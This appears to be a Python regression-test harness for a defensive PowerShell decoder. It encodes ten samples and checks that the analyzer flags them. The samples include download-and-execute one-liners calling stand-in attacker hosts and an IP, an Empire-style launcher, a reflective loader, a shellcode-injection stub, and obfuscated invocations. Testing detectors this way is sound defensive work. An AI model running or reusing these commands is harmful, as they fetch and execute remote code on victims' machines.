"""NivXRay Decoder — Real-World Validation Harness
──────────────────────────────────────────────────────────────────
Locked with SOC user 2026-07-25. Runs the 10-category validation
matrix and produces a pass/fail table. This is a REGRESSION GATE —
if any row fails, decoder correctness cannot be considered
feature-complete.

Categories:
    1. Clean PowerShell EncodedCommand           → full decode
    2. User-reported corrupted sample            → decode_error + partial
    3. Nested Base64 (Base64 wrapping Base64)    → full decode
    4. Base64 → GZip → UTF-16LE                  → full decode
    5. Base64 → Deflate → UTF-16LE               → full decode
    6. Empire launcher (real-world stager)       → full decode
    7. Sliver-style PS stager                    → full decode
    8. Cobalt Strike-style PS payload            → full decode
    9. Invoke-Obfuscation `-f` + join            → full decode (best-effort)
   10. Benign Base64 PowerShell (Get-Process)    → decode ok, benign verdict
"""
from __future__ import annotations

import base64
import gzip
import sys
import zlib
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from v2.semantic.ps_semantic import analyze                          # noqa: E402
from v2.semantic.ps_recovery import recover_powershell_from_b64      # noqa: E402


def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()


def _enc_cmdline(blob: str, flags: str = "-nop -w hidden -exec bypass") -> str:
    return f"powershell.exe {flags} -EncodedCommand {blob}"


CORRUPT_BLOB = (
    "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHKACWB0AGUAbQAuAEAZ"
    "QB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKAKQAUAEQAbwB3AG4AbABvAGEAZABTAHQ"
    "AcgBpAG4AZwAoACcAaAB0AHQAcAAA6ACAALwA0ADUALgAxADMANgAuADIAMwAwAC"
    "AWAADEAOgA0ADAAMAAwACAAyADMANABSADIAMWAnACkAOwA="
)


# ── Sample builders ──────────────────────────────────────────────
def sample_1_clean() -> tuple[str, str]:
    ps = "IEX (New-Object System.Net.WebClient).DownloadString('http://c2.evil.com/x.ps1')"
    return "Clean PS EncodedCommand", _enc_cmdline(_b64_utf16le(ps))


def sample_2_corrupted() -> tuple[str, str]:
    return "User-reported corrupted", f"powershell.exe -exec bypass -enc {CORRUPT_BLOB}"


def sample_3_nested_base64() -> tuple[str, str]:
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://c2.staged.com/n2.ps1')"
    inner_b64 = base64.b64encode(inner.encode()).decode()
    outer_ps = f"$c = [System.Convert]::FromBase64String('{inner_b64}'); IEX ([System.Text.Encoding]::UTF8.GetString($c))"
    return "Nested Base64", _enc_cmdline(_b64_utf16le(outer_ps))


def sample_4_gzip() -> tuple[str, str]:
    inner = "IEX (iwr 'http://staged.example.com/next.ps1')"
    gzipped = gzip.compress(inner.encode("utf-16-le"))
    return "Base64 -> GZip -> UTF-16LE", base64.b64encode(gzipped).decode()


def sample_5_deflate() -> tuple[str, str]:
    inner = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://drop.evil.com/loader.ps1')"
    # zlib deflate with header
    deflated = zlib.compress(inner.encode("utf-16-le"))
    return "Base64 -> Deflate -> UTF-16LE", base64.b64encode(deflated).decode()


def sample_6_empire() -> tuple[str, str]:
    # Empire-style launcher — the WebClient dance + Basic-Auth headers + downloadstring
    ps = (
        "$wc=New-Object System.Net.WebClient;"
        "$u='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1';"
        "$wc.Headers.Add('User-Agent',$u);"
        "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
        "$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultCredentials;"
        "$s='http://185.209.181.117:8080/index.jsp';"
        "IEX ($wc.DownloadString($s));"
    )
    return "Empire launcher", _enc_cmdline(_b64_utf16le(ps), flags="-NoP -W Hidden -ExecutionPolicy Bypass -NoLogo")


def sample_7_sliver() -> tuple[str, str]:
    # Sliver-style — reflective loader + shellcode delivery
    ps = (
        "$b64='TVpBRy4uLg==';"
        "$bytes=[System.Convert]::FromBase64String($b64);"
        "$asm=[System.Reflection.Assembly]::Load($bytes);"
        "$entry=$asm.EntryPoint;"
        "$entry.Invoke($null,$null);"
    )
    return "Sliver stager", _enc_cmdline(_b64_utf16le(ps))


def sample_8_cobalt_strike() -> tuple[str, str]:
    # Cobalt Strike-style PowerShell shellcode injector
    ps = (
        "$c='AAAAYInlM9BQaPu1olZo/W1u6IiwZ...';"
        "[Byte[]]$sc=[System.Convert]::FromBase64String($c);"
        "$k32=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);' -Name W -Namespace K32 -PassThru;"
        "$addr=$k32::VirtualAlloc(0,$sc.Length,0x3000,0x40);"
        "[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$addr,$sc.Length);"
    )
    return "Cobalt Strike", _enc_cmdline(_b64_utf16le(ps))


def sample_9_invoke_obfuscation() -> tuple[str, str]:
    # Invoke-Obfuscation classic — `-f` + char array + backtick
    ps = (
        "$v = ('{2}{0}{1}' -f 'nvoke-','Expression','I');"
        "$w = ('{2}{0}{1}{3}' -f 'wnloadS','tri','Do','ng');"
        "& $v ((New-Object Net.WebClient).$w('http://obf.evil/loader.ps1'))"
    )
    return "Invoke-Obfuscation -f/join", _enc_cmdline(_b64_utf16le(ps))


def sample_10_benign() -> tuple[str, str]:
    ps = "Get-Process | Where-Object { $_.Name -eq 'notepad' } | Format-Table -AutoSize"
    return "Benign Base64 PowerShell", _enc_cmdline(_b64_utf16le(ps))


SAMPLES = [
    sample_1_clean, sample_2_corrupted, sample_3_nested_base64,
    sample_4_gzip,  sample_5_deflate,   sample_6_empire,
    sample_7_sliver, sample_8_cobalt_strike, sample_9_invoke_obfuscation,
    sample_10_benign,
]


# ── Per-row validation ───────────────────────────────────────────
def _row(idx: int, label: str, ok: bool, expected: str, actual: str, extra: str = "") -> str:
    mark = "PASS" if ok else "FAIL"
    return f"  [{mark}] {idx:>2}. {label:<32} · expected={expected!r:<38} · got={actual!r}  {extra}"


def validate() -> tuple[bool, list[str]]:
    lines: list[str] = []
    all_ok = True

    for i, builder in enumerate(SAMPLES, 1):
        label, cmd = builder()

        if i == 4 or i == 5:
            rep = recover_powershell_from_b64(cmd)
            actual = "ok" if rep.status == "ok" else "decode_error"
            ok = actual == "ok"
            row = _row(i, label, ok, "ok", actual,
                       f"winner={rep.winner} conf={rep.confidence_band}")
        else:
            r = analyze(cmd)
            outcome = r.decode_outcome
            recovered = r.recovered_script
            behaviors = [b["id"] for b in r.behaviors_v2]
            vb = r.verdict_breakdown.get("verdict", "n/a")

            if i == 1:
                ok = (outcome == "fully_decoded" and "iex" in recovered.lower()
                      and vb in ("malicious", "suspicious"))
                exp, got = "fully_decoded + malicious/suspicious", f"{outcome} → {vb}"
            elif i == 2:
                partial = r.decode_error.get("partial_recovery") or {}
                ok = (outcome == "decode_error"
                      and partial.get("prefix_text","").startswith("iex")
                      and r.decode_error.get("confidence_band") == "low")
                exp = "decode_error + partial + low"
                got = (f"{outcome} · partial={bool(partial)} · "
                       f"band={r.decode_error.get('confidence_band')}")
            elif i == 3:
                ok = (outcome == "fully_decoded" and "frombase64string" in recovered.lower())
                exp, got = "fully_decoded + FromBase64String", outcome
            elif i == 6:
                # Empire — accept fully or partially decoded; MUST see IEX or WebClient
                ok = (outcome in ("fully_decoded", "partially_decoded")
                      and ("webclient_downloadstring" in behaviors
                           or "invoke_expression" in behaviors))
                exp = "decoded + WebClient/IEX"
                got = f"{outcome} · behaviors={behaviors[:4]}"
            elif i == 7:
                ok = (outcome in ("fully_decoded", "partially_decoded")
                      and ("reflection" in behaviors or "fileless_execution" in behaviors))
                exp = "decoded + reflection/fileless"
                got = f"{outcome} · behaviors={behaviors[:4]}"
            elif i == 8:
                ok = (outcome in ("fully_decoded", "partially_decoded")
                      and ("process_injection" in behaviors
                           or "payload_decode" in behaviors
                           or "reflection" in behaviors))
                exp = "decoded + injection/decode/reflection"
                got = f"{outcome} · behaviors={behaviors[:4]}"
            elif i == 9:
                ok = (outcome in ("fully_decoded", "partially_decoded")
                      and "string_reconstruction" in behaviors)
                exp = "decoded + string_reconstruction"
                got = f"{outcome} · behaviors={behaviors[:5]}"
            elif i == 10:
                ok = (outcome == "fully_decoded"
                      and vb in ("informational", "needs_review", "benign"))
                exp = "fully_decoded + informational/benign"
                got = (f"{outcome} → {vb} "
                       f"(risk={r.verdict_breakdown.get('risk_score')})")
            else:
                ok, exp, got = False, "unknown", "unknown"

            row = _row(i, label, ok, exp, got)
        if not ok:
            all_ok = False
        lines.append(row)
    return all_ok, lines


if __name__ == "__main__":
    ok, lines = validate()
    print("=" * 96)
    print("NivXRay Decoder — Real-World Validation Matrix")
    print("=" * 96)
    for l in lines:
        print(l)
    print("=" * 96)
    print("RESULT:", "ALL 10/10 PASS" if ok else "REGRESSION DETECTED — see failures above")
    sys.exit(0 if ok else 1)
